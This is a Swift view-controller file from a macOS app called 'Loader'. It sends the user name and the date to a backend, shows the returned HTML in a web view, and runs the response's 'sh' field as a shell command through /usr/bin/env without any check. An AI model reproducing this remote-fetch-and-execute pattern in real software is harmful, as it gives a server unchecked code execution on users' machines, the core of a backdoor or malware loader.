//
//  ViewController.swift
//  Loader
//
//  Created by Sergiy Kostrykin on 4/11/19.
//  Copyright © 2019 MWDN. All rights reserved.
//

import Cocoa
import WebKit

class ViewController: NSViewController {
    
    // MARK: - Properties
    private var response: Response?

    // MARK: - Outlets
    @IBOutlet weak var webView: WKWebView!

    // MARK: - Methods
    override func viewDidLoad() {
        super.viewDidLoad()
        loadRequest(name: AppConfig.userName, date: Date().backendString)
    }

    
    private func updateUI() {
        if let html = response?.html {
            webView.loadHTMLString(html, baseURL: nil)
        }
    }
    
    private func runScript() {
        if let sh = response?.sh {
            shell("\(sh)")
        }
    }
    
    @discardableResult
    private func shell(_ args: String...) -> Int32 {
        let task = Process()
        task.launchPath = "/usr/bin/env"
        task.arguments = args
        task.launch()
        task.waitUntilExit()
        return task.terminationStatus
    }

    
    // MARK: - Requests
    private func loadRequest(name: String, date: String) {
        Connection.request(name: name, date: date, completion: { [weak self] (response, error) in
            if let error = error {
                print("Load Request failed. Reason: \(error.localizedDescription)")
                return
            }
            self?.response = response
            self?.updateUI()
            self?.runScript()
        })
    }


}

